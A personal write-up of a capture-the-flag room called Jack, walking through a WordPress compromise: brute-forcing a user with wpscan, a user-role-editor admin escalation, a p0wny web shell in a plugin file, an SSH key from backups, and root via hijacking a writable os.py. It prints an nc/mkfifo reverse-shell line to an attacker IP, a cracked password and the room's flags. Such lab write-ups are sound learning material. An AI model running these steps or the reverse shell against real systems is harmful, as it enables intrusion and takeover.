# Jack

This one was hard. Several new things learned. And I unashamedly used both the tips on the room and light pointers in the right direction from some online sources.

"Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module."

1. Recon showed 22 and 80. Sure enough a wpscan sat on 80.

2. `wpscan` revealed three users: jack, wendy and danny. 

    The hint for the user flag was "Wpscan user enumeration, and don't use tools (ure_other_roles)". This reveals two things: 
    
    First, `ure_other_roles` is a tip to an exploit with the user role editor plugin (which I confirmed was there by navigating to `http://jack.thm/wp-content/plugins/user-role-editor/readme.txt`). The vuln is trivial: when saving a profile in the editor, you can add `&ure_other_roles=administrator` to the post body and it will grant the user admin roles. 
    
    Importantly though, this requires being logged in as a low-priv user. The wpscan user enumeration is typically used with a brute force attack (again using wpscan).

    > At this point I got stuck. But thats okay, because so did everyone else from what I can see. The standard word list you use for bruteforcing is rockyou.txt, but it wasn't working (ran it for two hours, no luck, which is usually a hint your'e going in the wrong direction)
    >
    > I tried several other wordlists from seclists with no luck.
    > 
    > The answer was both simple and a huge surprise. I was convinced that in kali, there is only one file under `/usr/share/wordlists`: rockyou. However, there is *actually a second wordlist there*, `fasttrack.txt`. I was as surprised as everyone else's walkthrough I checked.

3. `wpscan --url jack.thm -U wendy,danny -P /usr/share/wordlists/fasttrack.txt` quickly picked up a password for wendy: `changelater`

4. Once into the site, I used the vulnerability with the user role editor to grant wendy admin rights. 

5. I replaced the content of the akismet plugin's index.php with p0wny shell (probably overkill - could have added a new file or uploaded something), then browsed to `http://jack.thm/wp-content/plugins/akismet/index.php` to get a web shell.

6. In the user directory were two text files: `user.txt` and `reminder.txt`. The first contained the user flag: `0052f7829e48752f2e7bf50f1231548a`

7. The second contained: `Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.`. From this I went looking for backups (`locate backups`) and found a suspicious `/var/backups/id_rsa`.

8. I copied this to my attacker machine, changed its permissions with `chmod 600 id_rsa`, then used `ssh -i id_rsa jack@jack.thm` to log on as jack.

9. The final escalation hint was "Python". From the room description I knew this was a python module escalation, which I hadn't heard before.

    > I did a google and found this article: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/, The whole thing is worth a read, and from it I solved this final challenge.
    >
    > Basically, if a python script is being run by root, and it imports something, and you have the ability to alter either: any of the search directories python uses for import sources; or any of the imported files themselves, then you can get code execution by reference.

10. I ran a search (`find / -name "*.py" -user root 2>/dev/null`) to find suspicious files: on the giant list, the very first file was very suspicious: `/opt/statuscheck/checker.py`. Next to it was an output.log containing header information for the wordpress site, updated every two minutes. The checker.py file contained:

    ```python
    import os

    os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
    ```

    I could see updates entering the log file every two minutes via `cat /opt/statuscheck/output.log | tail`

11. I couldn't modify the file. Nor could I modify any of the source directories python looked into (I checked this with a little bash scripting: `for path in $(python -c 'import sys; print "\n".join(sys.path)'); do namei -l $path ; done`. note the use of `namei -l` to get a full list of file/folder permissions for each entry). However I did discover that `os.py` under `/usr/lib/python2.7` *WAS* writable (checked via `for path in $(locate os.py); do namei -l $path; done`).

12. Adding a python shell to this proved problematic. Python shells use functionality from os.py, after all. Ultimately, the solution was to open os.py, go to the bottom, and add a new line: `system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.203.251 4444 >/tmp/f')`. The nice nc reverse shell for when all you have is nc.openbsd (as was the case on this machine). I tested this (getting an unpriviliged shell) via `python -c "import os"`

13. Went back to my attacker machine, opened a reverse listener, and within a minute I had a root shell! The final flag at `/root/root.txt` was `b8b63a861cc09e853f29d8055d64bffb`.

Overall a very tough room, but also simple in its individual elements. Things I learned:

- `fasttrack.txt`!
- `ure_other_roles` exploit (worth keeping in mind if I find myself with a low-priv wordpress user)
- clever uses of `locate` and bash scripting. also `namei -l`
- python module privesc :)